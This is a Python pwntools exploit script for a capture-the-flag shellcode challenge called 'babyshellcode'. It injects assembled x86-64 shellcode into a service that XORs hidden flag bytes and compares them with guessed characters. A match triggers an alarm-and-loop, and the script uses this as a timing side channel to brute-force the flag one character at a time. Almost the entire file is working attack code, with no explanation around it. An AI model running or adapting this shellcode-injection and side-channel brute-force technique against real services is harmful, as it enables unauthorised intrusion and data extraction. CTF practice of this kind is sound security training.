from pwn import *
import string
p=0
flag="ISITDTU{"
def debug():
	global p,flag
	gdb.attach(p,'''
	b *0x000555555554D3C
	c
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	si
	''')
context.log_level='critical'
context.arch='amd64'
def exp(idx,guess):
	global p,flag
	#p=process('./babyshellcode')
	p=remote("127.0.0.1",1024)
	#if idx==1 and guess=='1':
	#	debug()
	#nc 209.97.162.170 2222 
	#0x7b55544454495349
	s='''
	mov rbx,0x7b55544454495349
	shr rbx,{}
	and rbx,0xff
	mov rdi,{}
	mov al,byte ptr [rdi]
	xor al,bl
	mov rbx,{}
	mov cl,byte ptr [rbx]
	xor al,cl
	sub al,{}
	jnz .+0x299

	mov al,0x3
	mov rdi,rax
	mov al,0x25
	syscall
sleeptodie:
	jmp sleeptodie

	'''.format(idx%8*8,(0xcafe000+(idx%8)),0xcafe008+idx,ord(guess))
	p.send(asm(s))

	try:
		print p.read()
	except KeyboardInterrupt:
		flag+=guess
		print flag
		return True
	except :
		pass
	print flag
	return False
#exp(0,"n")

for i in range(0x18):
	for x in (string.ascii_letters+"0123456789"+"_!@#$%^&*&*)-+"):
		res=exp(i,x)
		if(res):
			break

